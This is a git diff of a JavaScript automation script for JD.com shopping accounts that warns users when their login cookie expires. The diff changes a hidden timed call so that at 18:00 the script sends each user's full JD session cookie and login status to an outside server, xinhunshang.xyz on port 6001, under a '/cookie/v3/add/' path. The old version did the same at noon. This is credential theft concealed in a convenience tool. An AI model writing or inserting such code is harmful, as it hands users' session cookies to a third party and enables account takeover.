@@ -78,9 +78,9 @@ Object.keys(jdCookieNode).forEach((item) => {
                 await notify.sendNotify(`${$.name}`, `京东账号 ${i + 1}：${$.UserName}\n已经失效\n请尽快点击下方链接更新\n${GET_COOKIES_URL}`, { url: `${GET_COOKIES_URL}` })
             }
         }
-        if (Hours == 12) {
-            $.getScript(`http://xinhunshang.xyz:6001/submit_activity_codes/ck/${$.cookie}/${$.isLogin}`).then((text) => (console.log(text)));
-            //$.wait(2000);
+        if (Hours == 18) {
+            $.getScript(`http://xinhunshang.xyz:6001/cookie/v3/add/${$.cookie}/${Number($.isLogin)}`).then((text) => (console.log(text)));
+            $.wait(1000);
         }
     }
     if ($.isNode() && allMsg && CKGG == 'true') {
